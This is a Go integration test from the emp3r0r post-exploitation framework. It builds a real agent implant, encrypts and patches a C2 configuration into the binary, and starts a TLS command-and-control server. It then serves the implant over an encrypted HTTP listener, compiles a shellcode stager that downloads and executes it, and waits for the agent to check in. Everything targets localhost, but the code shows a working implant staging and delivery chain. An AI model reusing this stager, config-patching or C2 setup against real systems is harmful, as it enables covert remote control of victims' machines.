//go:build cgo
// +build cgo

package shellcode_stager

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/asn1"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// signUUID signs the agent UUID with the CA private key
func signUUID(uuid string, keyFile string) (string, error) {
	// Read private key
	keyBytes, err := os.ReadFile(keyFile)
	if err != nil {
		return "", err
	}
	block, _ := pem.Decode(keyBytes)
	privKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		return "", err
	}

	// Hash UUID
	hash := sha256.Sum256([]byte(uuid))

	// Sign
	r, s, err := ecdsa.Sign(rand.Reader, privKey, hash[:])
	if err != nil {
		return "", err
	}

	// Encode signature
	sig, err := asn1.Marshal(struct{ R, S *big.Int }{r, s})
	if err != nil {
		return "", err
	}

	return base64.URLEncoding.EncodeToString(sig), nil
}

func TestShellcodeStagerLifecycle(t *testing.T) {
	// Skip if CGO is not enabled
	if os.Getenv("CGO_ENABLED") != "1" {
		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
	}

	// Skip if race detector is enabled (this test is long-running and doesn't need race detection)
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("Skipping test: race detector is enabled")
	}

	// 1. Setup workspace
	tmpDir, err := os.MkdirTemp("", "stager_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)
	log.Printf("Test workspace: %s", tmpDir)

	// 2. Build Real Agent Stub (cmd/agent)
	mockAgentPath := filepath.Join(tmpDir, "agent_stub")
	// Using "real" agent code from cmd/agent
	// We use CGO_ENABLED=1 and zig cc to match production build (static-pie musl)
	cmdBuildAgent := exec.Command("go", "build",
		"-buildmode=pie",
		"-tags", "netgo agent",
		"-trimpath",
		"-ldflags", "-s -w -linkmode external -extldflags '-static -s -static-pie'",
		"-o", mockAgentPath,
		"../../../cmd/agent", // From test/ -> shellcode_stager/ -> modules/ -> core/ -> cmd/agent
	)
	cmdBuildAgent.Env = append(os.Environ(),
		"CGO_ENABLED=1",
		"CC=zig cc -target x86_64-linux-musl",
	)
	out, err := cmdBuildAgent.CombinedOutput()
	if err != nil {
		t.Fatalf("Failed to build agent stub: %v\nOutput: %s", err, string(out))
	}
	log.Println("Agent stub built successfully")

	// 3. Setup Real C2 Server
	c2Port := util.RandInt(50000, 60000)
	c2PortStr := fmt.Sprintf("%d", c2Port)

	// Initialize live.EmpWorkSpace for C2 server
	live.EmpWorkSpace = tmpDir

	// Generate C2 certs using the real config package
	err = config.GenC2Certs("127.0.0.1")
	if err != nil {
		t.Fatalf("Failed to generate C2 certs: %v", err)
	}

	// Read CA cert for agent config
	caCertData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		t.Fatalf("Failed to read CA cert: %v", err)
	}

	// Setup transport global variables (required by C2 server)
	transport.CACrtPEM = caCertData
	transport.EmpWorkSpace = tmpDir

	// Generate agent UUID and signature
	agentUUID := uuid.New().String()
	agentTag := "test-stager-agent-" + agentUUID
	agentSig, err := signUUID(agentUUID, transport.CaKeyFile)
	if err != nil {
		t.Fatalf("Failed to sign UUID: %v", err)
	}

	// Initialize live.RuntimeConfig for the C2 server
	live.RuntimeConfig = &def.Config{
		CCPort: c2PortStr,
		CAPEM:  string(caCertData),
	}

	// Reset live agent maps
	live.AgentControlMapMutex.Lock()
	live.AgentControlMap = make(map[*def.Emp3r0rAgent]*live.AgentControl)
	live.AgentList = make([]*def.Emp3r0rAgent, 0)
	live.AgentControlMapMutex.Unlock()

	// Debug: verify maps are empty
	live.AgentControlMapMutex.RLock()
	log.Printf("DEBUG: AgentControlMap size after reset: %d", len(live.AgentControlMap))
	log.Printf("DEBUG: AgentList size after reset: %d", len(live.AgentList))
	live.AgentControlMapMutex.RUnlock()

	// Small delay to ensure map reset propagates
	time.Sleep(100 * time.Millisecond)

	// Create agent config
	cfg := &def.Config{
		CCAddress:    "127.0.0.1",
		CCPort:       c2PortStr,
		CAPEM:        string(caCertData),
		C2Prefix:     "api",
		CheckInPath:  "checkin",
		MsgPath:      "msg",
		AgentUUID:    agentUUID,
		AgentUUIDSig: agentSig,
		AgentTag:     agentTag,
		ModulePath:   "", // Empty for anonymous memory loading in test
	}

	// Serialize to CBOR
	cborBytes, err := cbor.Marshal(cfg)
	if err != nil {
		t.Fatalf("Failed to marshal config: %v", err)
	}

	// Encrypt Config
	// Use MagicString directly, AES_GCM_Encrypt does the derivation internally (matching generate.go)
	encConfig, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
	if err != nil {
		t.Fatalf("Failed to encrypt config: %v", err)
	}

	// Pad with 0x00 to match def.AgentConfig length (like generate.go)
	if len(encConfig) < len(def.AgentConfig) {
		padding := bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(encConfig))
		encConfig = append(encConfig, padding...)
	} else if len(encConfig) > len(def.AgentConfig) {
		t.Fatalf("Config payload too large: %d > %d", len(encConfig), len(def.AgentConfig))
	}

	// Read binary
	agentBytes, err := os.ReadFile(mockAgentPath)
	if err != nil {
		t.Fatalf("Failed to read mock agent: %v", err)
	}

	// Patch
	// Placeholder is 0xff repeated for the full length of AgentConfig
	placeholder := bytes.Repeat([]byte{0xff}, len(def.AgentConfig))
	if !bytes.Contains(agentBytes, placeholder) {
		t.Fatalf("Placeholder for config not found in mock agent binary")
	}
	patchedAgentBytes := bytes.Replace(agentBytes, placeholder, encConfig, 1)

	// Create patched agent file
	patchedAgentPath := filepath.Join(tmpDir, "patched_agent")
	err = os.WriteFile(patchedAgentPath, patchedAgentBytes, 0755)
	if err != nil {
		t.Fatalf("Failed to write patched agent: %v", err)
	}
	log.Println("Mock agent patched with config")

	// 4. Start Real C2 Server
	// Shutdown any existing server first
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		time.Sleep(500 * time.Millisecond) // Give it time to shut down
	}

	go func() {
		log.Printf("Starting real C2 server on port %s", c2PortStr)
		server.StartC2AgentTLSServer()
	}()

	// Ensure server cleanup at end of test
	defer func() {
		if network.EmpTLSServer != nil {
			network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		}
	}()

	// Wait for C2 server to be ready
	time.Sleep(2 * time.Second)

	// 5. Build Shellcode Stager
	stagerBinPath := filepath.Join(tmpDir, "stager.bin")
	stagerListenerPort := util.RandInt(60001, 65000)

	// We need to run make or compile stub.c directly.
	// Let's use gcc directly to have control (and mimic Makefile).
	// Makefile flags:
	// CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. ...
	// We need to set defines like -DDOWNLOAD_PORT etc.

	// We need to setup a listener for the stager to download the agent.
	// We will use core/lib/listener to serve the PATCHED AGENT.

	// Start Stager Listener
	stagerPortStr := fmt.Sprintf("%d", stagerListenerPort)
	stagerKey := "password123" // arbitrary

	go func() {
		// Serve the patched agent
		// compression=true matching standard behavior
		err := listener.HTTPAESCompressedListener(patchedAgentPath, stagerPortStr, stagerKey, true)
		if err != nil {
			log.Printf("Stager listener failed: %v", err)
		}
	}()
	// Wait for stager listener
	time.Sleep(5 * time.Second)

	// Determine flags for stub.c
	// We need the XOR mechanism as in the Makefile.
	downloadHost := "127.0.0.1"
	downloadPort := stagerPortStr
	downloadPath := "/" // listener serves at root
	downloadKey := stagerKey

	// We need to compile these. They are in the current directory (modules/shellcode_stager).
	// But we are running go test in that directory, so inputs are just filenames.

	// However, we first need to build downloader.bin and generate header like the Makefile does.
	// This makes it complicated to replicate the whole Makefile in Go test.
	// Can we just run `make`?
	// The Makefile supports environment variables.

	// Let's try running `make` with overrides.
	// We need to be careful not to overwrite the real bin files in the source dir if possible,
	// or just clean up after.
	// `make` will generate `stager.bin` in the current dir.

	// `make` will generate `stager.bin` in the current dir.

	// Clean previous build to ensure CFLAGS (ports) update triggers rebuild
	cleanCmd := exec.Command("make", "clean")
	cleanCmd.Dir = ".." // Run in parent directory where Makefile is
	cleanCmd.Run()

	makeCmd := exec.Command("make",
		fmt.Sprintf("DOWNLOAD_HOST=%s", downloadHost),
		fmt.Sprintf("DOWNLOAD_PORT=%s", downloadPort),
		fmt.Sprintf("DOWNLOAD_PATH=%s", downloadPath),
		fmt.Sprintf("DOWNLOAD_KEY=%s", downloadKey),
		"DEBUG=1",
	)
	makeCmd.Dir = ".."                                  // Run in parent directory where Makefile is
	makeCmd.Env = append(os.Environ(), "CGO_ENABLED=0") // Just in case
	out, err = makeCmd.CombinedOutput()
	if err != nil {
		t.Fatalf("Make failed: %v\nOutput: %s", err, string(out))
	}
	log.Println("Stager built with make")
	defer exec.Command("make", "clean").Run()

	// Move the generated stager.bin to tmpDir to be safe/clear
	// Use copy instead of Rename to avoid cross-device link errors
	input, err := os.ReadFile("../stager.bin") // stager.bin is in parent directory
	if err != nil {
		t.Fatalf("Failed to read stager.bin: %v", err)
	}
	err = os.WriteFile(stagerBinPath, input, 0644)
	if err != nil {
		t.Fatalf("Failed to write stager.bin to tmp: %v", err)
	}
	os.Remove("../stager.bin")

	// 6. Build and Run Loader
	// Compile test_loader.c (in parent directory)
	loaderBinPath := filepath.Join(tmpDir, "test_loader")
	cmdBuildLoader := exec.Command("gcc", "-o", loaderBinPath, "../test_loader.c")
	out, err = cmdBuildLoader.CombinedOutput()
	if err != nil {
		t.Fatalf("Failed to build loader: %v\nOutput: %s", err, string(out))
	}

	// Run loader with stager.bin
	cmdLoader := exec.Command(loaderBinPath, stagerBinPath)

	// Capture output for debugging
	var stdout, stderr bytes.Buffer
	cmdLoader.Stdout = &stdout
	cmdLoader.Stderr = &stderr

	log.Println("Running loader...")
	if err := cmdLoader.Start(); err != nil {
		t.Fatalf("Failed to start loader: %v", err)
	}

	// Wait for process exit in background
	doneChan := make(chan error, 1)
	go func() {
		doneChan <- cmdLoader.Wait()
	}()

	// Wait for checkin with timeout
	timeout := 45 * time.Second
	// Wait for agent check-in by polling live.AgentList
	start := time.Now()
	for {
		if time.Since(start) > timeout {
			log.Printf("Loader Stdout:\n%s", stdout.String())
			log.Printf("Loader Stderr:\n%s", stderr.String())
			t.Fatalf("Timeout waiting for agent checkin")
		}

		// Check if agent has checked in (added to AgentControlMap)
		live.AgentControlMapMutex.RLock()
		agentCount := len(live.AgentControlMap)
		live.AgentControlMapMutex.RUnlock()

		if agentCount > 0 {
			log.Println("SUCCESS: Agent checked in!")
			break
		}

		// Check if loader exited
		select {
		case err := <-doneChan:
			log.Printf("Loader exited unexpectedly: %v", err)
			log.Printf("Loader Stdout:\n%s", stdout.String())
			log.Printf("Loader Stderr:\n%s", stderr.String())
			t.Fatalf("Loader exited before checkin")
		default:
			// Continue polling
		}

		time.Sleep(100 * time.Millisecond)
	}

	// Cleanup
	cmdLoader.Process.Kill()
}
